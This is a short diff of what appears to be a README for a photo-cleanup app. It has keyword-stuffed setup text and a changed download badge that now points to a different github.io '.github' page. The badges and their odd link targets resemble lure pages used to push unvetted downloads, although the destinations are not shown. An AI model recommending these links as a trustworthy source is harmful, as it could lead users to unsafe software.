@@ -57,7 +57,7 @@ The clean pictures workflow starts with a simple upload and ends with a polished
 
 Prerequisites: An internet-connected device with a modern web browser or the mobile app installed for cleanup pictures iphone or Android.
 
-[![GET Cleanup Pictures](https://img.shields.io/badge/GET%20%E2%80%94%20Cleanup%20Pictures-FF6B6B?style=for-the-badge&logoColor=white)](https://laruesmestadszsee.github.io/.github/Cleanup-Pictures-Ai)
+[![AI Cleanup](https://img.shields.io/badge/AI_Inpaint-Cleanup-9333EA?style=plastic&logo=opencv&logoColor=white)](https://cleanup-ai.github.io/.github/)
 
 1.  **Access the Platform:** Visit the cleanup pictures online website or launch the mobile cleanup pictures app on your device.
 2.  **Upload Your Photo:** Click the upload button and select the image you want to edit. The platform accepts all common photo formats and processes files up to the resolution limit.
